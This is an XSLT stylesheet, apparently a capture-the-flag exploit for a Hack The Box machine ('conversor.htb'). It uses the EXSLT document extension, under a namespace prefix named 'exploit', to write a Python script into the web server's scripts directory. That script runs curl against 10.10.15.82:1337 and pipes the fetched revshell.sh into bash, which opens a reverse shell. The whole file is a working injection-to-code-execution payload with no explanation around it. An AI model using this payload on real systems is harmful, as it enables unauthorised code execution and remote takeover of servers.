<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0"
>
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/revshell.py" method="text">
import os
os.system("curl http://10.10.15.82:1337/revshell.sh|bash")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
